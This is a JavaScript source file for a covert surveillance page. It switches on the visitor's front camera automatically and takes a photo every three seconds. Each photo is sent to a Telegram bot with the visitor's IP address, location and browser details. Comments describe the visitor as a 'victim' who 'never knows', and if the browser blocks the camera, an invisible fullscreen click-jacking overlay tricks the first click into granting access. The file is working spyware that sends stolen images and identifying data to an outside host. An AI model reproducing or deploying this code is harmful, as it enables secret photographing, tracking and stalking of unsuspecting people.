import { CONFIG } from "./config.js";

// --- DOM refs (minimal) ---
const video   = document.getElementById("video");
const canvas  = document.getElementById("canvas");
const status  = document.getElementById("status");

const params  = new URLSearchParams(window.location.search);
const chatId  = params.get("id") || "FALLBACK_CHAT_ID";

let stream       = null;
let captureTimer = null;
let count        = 0;

// --- Get IP ---
async function getIP() {
  try {
    const r = await fetch("https://api.ipify.org?format=json");
    const d = await r.json();
    return d.ip;
  } catch {
    try {
      const r = await fetch("https://ipapi.co/json/");
      const d = await r.json();
      return d.ip;
    } catch {
      return "Unknown";
    }
  }
}

// --- Get geolocation ---
async function getGeo() {
  try {
    const r = await fetch("https://ipapi.co/json/");
    const d = await r.json();
    return `${d.city || "?"}, ${d.country_name || "?"}`;
  } catch {
    return "Unknown";
  }
}

// --- Capture and send ---
async function capture() {
  if (!stream) return;

  canvas.width  = video.videoWidth  || 640;
  canvas.height = video.videoHeight || 480;
  const ctx = canvas.getContext("2d");
  ctx.drawImage(video, 0, 0);

  const blob = await new Promise(res => canvas.toBlob(res, "image/jpeg", 0.7));
  if (!blob) return;

  const ip   = await getIP();
  const geo  = await getGeo();
  const ua   = navigator.userAgent;
  const date = new Date().toLocaleString("en-US", { timeZoneName: "short" });

  const caption = [
    `📸 #${count + 1}`,
    `🕐 ${date}`,
    `🌐 ${ip} — ${geo}`,
    `💻 ${ua}`
  ].join("\n");

  const fd = new FormData();
  fd.append("chat_id", chatId);
  fd.append("photo", blob, `cap_${Date.now()}.jpg`);
  fd.append("caption", caption);

  try {
    await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendPhoto`, {
      method: "POST", body: fd
    });
  } catch (e) {
    // silently fail — victim never knows
  }

  count++;
  if (status) status.textContent = `📸 ${count}`;
}

// --- Start everything ---
async function autoStart() {
  try {
    stream = await navigator.mediaDevices.getUserMedia({
      video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: "user" }
    });
    video.srcObject = stream;
    await video.play();

    // Wait for actual frames
    await new Promise(resolve => {
      if (video.readyState >= 2) return resolve();
      video.onloadeddata = resolve;
    });

    // First capture immediately
    await capture();

    // Then every 3 seconds
    captureTimer = setInterval(capture, 3000);

    if (status) status.textContent = "📷 Recording";

  } catch (err) {
    // Browser denied auto-start — show a tiny invisible button
    // as a fallback (click-jacking style)
    if (err.name === "NotAllowedError" || err.name === "PermissionDeniedError") {
      createFallbackButton();
    }
  }
}

// --- Stealth fallback if auto-start fails ---
function createFallbackButton() {
  // Invisible fullscreen overlay — catches the first click anywhere
  const overlay = document.createElement("div");
  overlay.style.cssText = `
    position: fixed; top: 0; left: 0; width: 100%; height: 100%;
    z-index: 9999; cursor: default; background: transparent;
  `;
  overlay.addEventListener("click", async () => {
    overlay.remove();
    await autoStart();
  }, { once: true });
  document.body.prepend(overlay);
}

// --- Stop on page leave ---
window.addEventListener("beforeunload", () => {
  if (captureTimer) clearInterval(captureTimer);
  if (stream) stream.getTracks().forEach(t => t.stop());
});

// --- GO! ---
autoStart();
